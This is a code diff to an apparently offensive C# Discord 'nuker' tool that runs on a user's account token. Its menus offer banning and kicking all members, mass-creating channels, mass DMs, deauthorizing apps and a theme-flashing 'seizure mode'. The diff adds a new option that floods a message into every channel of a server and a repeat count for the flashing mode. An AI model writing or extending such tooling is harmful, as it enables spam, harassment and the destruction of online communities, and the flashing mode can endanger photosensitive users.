@@ -146,6 +146,10 @@ namespace nuker
                 {
                     Console.Write("Token: ");
                     string token = Console.ReadLine();
+                    if (token.Contains("\""))
+                    {
+                        token = token.Replace("\"", "");
+                    }
 
                     SaveConfig(token);
 
@@ -427,7 +431,7 @@ namespace nuker
             Console.WriteLine("{0,-20} {1,29}", "[5] Remove Connections", "[6] Deauthorize Apps");
             Console.WriteLine("{0,-20} {1,25}", "[7] Mass Create Guilds", "[8] Seizure Mode");
             Console.WriteLine("{0,-20} {1,23}", "[9] Confuse Mode", "[10] Mass DM");
-            Console.WriteLine("{0,-20} {1,34}", "[11] User Info", "[12] Block Relationships");
+            Console.WriteLine("{0,-20} {1,35}", "[11] User Info", "[12] Block Relationships");
             Console.WriteLine("{0,-20} {1,20}", "[13] Go Back", "[14] Exit");
 
             Console.WriteLine();
@@ -522,8 +526,12 @@ namespace nuker
                 case 7:
                     try
                     {
+                        Console.Clear();
+                        WriteLogo();
                         Console.Write("Guild name: ");
                         string name = Console.ReadLine();
+                        Console.Clear();
+                        WriteLogo();
 
                         while (true)
                         {
@@ -542,12 +550,23 @@ namespace nuker
                 case 8:
                     try
                     {
-                        while (true)
+                        Console.Clear();
+                        WriteLogo();
+                        Console.Write("Count: ");
+                        string count = Console.ReadLine();
+                        Console.Clear();
+                        WriteLogo();
+
+                        for (int i = 0; i < int.Parse(count); i++)
                         {
-                            client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Light });
-                            Thread.Sleep(WaitTimeShort);
-                            client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Dark });
-                            Thread.Sleep(WaitTimeShort);
+                            try
+                            {
+                                client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Light });
+                                Thread.Sleep(WaitTimeShort);
+                                client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Dark });
+                                Thread.Sleep(WaitTimeShort);
+                            }
+                            catch { }
                         }
                     }
                     catch
@@ -571,8 +590,12 @@ namespace nuker
                     DoneMethod();
                     break;
                 case 10:
+                    Console.Clear();
+                    WriteLogo();
                     Console.Write("Message: ");
                     string message = Console.ReadLine();
+                    Console.Clear();
+                    WriteLogo();
 
                     foreach (var relationship in client.GetRelationships())
                     {
@@ -660,7 +683,8 @@ namespace nuker
             Console.WriteLine("{0,-20} {1,26}", "[7] Mass Create Channels", "[8] Ban All Members");
             Console.WriteLine("{0,-20} {1,23}", "[9] Kick All Members", "[10] Mass DM");
             Console.WriteLine("{0,-20} {1,28}", "[11] Server Info", "[12] Leave Server");
-            Console.WriteLine("{0,-20} {1,20}", "[13] Go Back", "[14] Exit");
+            Console.WriteLine("{0,-20} {1,18}", "[13] Msg in every channel", "[14] Go Back");
+            Console.WriteLine("[15] Exit");
 
             Console.WriteLine();
             Console.Write("Your choice: ");
@@ -754,8 +778,13 @@ namespace nuker
                 case 7:
                     try
                     {
+                        Console.Clear();
+                        WriteLogo();
                         Console.Write("Channel name: ");
                         string name = Console.ReadLine();
+                        Console.Clear();
+                        WriteLogo();
+
                         for (int i = 0; i < 100; i++)
                         {
                             try
@@ -797,11 +826,14 @@ namespace nuker
                     DoneMethod2();
                     break;
                 case 10:
+                    Console.Clear();
+                    WriteLogo();
                     Console.Write("Message: ");
                     string message = Console.ReadLine();
+                    Console.Clear();
+                    WriteLogo();
 
-                    var get = client.GetCachedGuild(Convert.ToUInt64(guildid));
-                    var members = get.GetMembers();
+                    var members = client.GetCachedGuild(Convert.ToUInt64(guildid)).GetMembers();
 
                     foreach (var user in members)
                     {
@@ -837,11 +869,75 @@ namespace nuker
                     }
                     catch 
                     { }
+                    DoneMethod2();
                     break;
                 case 13:
-                    Start();
+                    Console.Clear();
+                    WriteLogo();
+                    Console.WriteLine("[1] Spam");
+                    Console.WriteLine("[2] One Message");
+                    Console.WriteLine();
+                    Console.Write("Your choice: ");
+                    string choice = Console.ReadLine();
+                    if (choice == "1")
+                    {
+                        Console.Clear();
+                        WriteLogo();
+                        Console.Write("Message: ");
+                        string msg = Console.ReadLine();
+                        Console.Clear();
+                        WriteLogo();
+                        Console.Write("Messages count: ");
+                        string count = Console.ReadLine();
+                        Console.Clear();
+                        WriteLogo();
+                        int total = 0;
+                        for (int i = 0; i < int.Parse(count); i++)
+                        {
+                            try
+                            {
+                                total++;
+                                foreach (var roles in guild.GetChannels())
+                                {
+                                    try
+                                    {
+                                        ulong id = roles.Id;
+                                        client.SendMessage(id, msg);
+                                        Thread.Sleep(WaitTimeShort);
+                                    }
+                                    catch { }
+                                }
+
+                            }
+                            catch { }
+                        }
+                    }
+                    else
+                    {
+                        Console.Clear();
+                        WriteLogo();
+                        Console.Write("Message: ");
+                        string msg = Console.ReadLine();
+                        Console.Clear();
+                        WriteLogo();
+
+                        foreach (var roles in guild.GetChannels())
+                        {
+                            try
+                            {
+                                ulong id = roles.Id;
+                                client.SendMessage(id, msg);
+                                Thread.Sleep(WaitTimeShort);
+                            }
+                            catch { }
+                        }
+                    }
+                    DoneMethod2();
                     break;
                 case 14:
+                    Start();
+                    break;
+                case 15:
                     Environment.Exit(0);
                     break;
             }
